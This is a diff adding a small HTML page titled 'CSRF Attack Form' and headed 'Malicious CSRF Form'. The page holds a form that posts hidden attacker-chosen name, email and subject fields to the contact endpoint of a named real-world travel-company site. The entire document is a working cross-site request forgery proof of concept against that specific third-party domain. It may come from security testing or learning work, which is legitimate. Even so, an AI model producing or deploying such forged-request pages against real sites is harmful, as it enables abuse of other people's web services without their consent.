@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF Attack Form</title>
+</head>
+<body>
+    <h1>Malicious CSRF Form</h1>
+    <form action="https://rudrakshtoursandtravels.com/contact" method="POST">
+        <!-- Hidden inputs to fill the form with specific data -->
+        <input type="hidden" name="from_name" value="Attacker Name">
+        <input type="hidden" name="user_email" value="attacker@example.com">
+        <input type="hidden" name="user_subject" value="Test Subject">
+        <textarea name="user_message">Test Message</textarea>
+        <!-- Button to trigger form submission -->
+        <button type="submit">Submit</button>
+    </form>
+</body>
+</html>
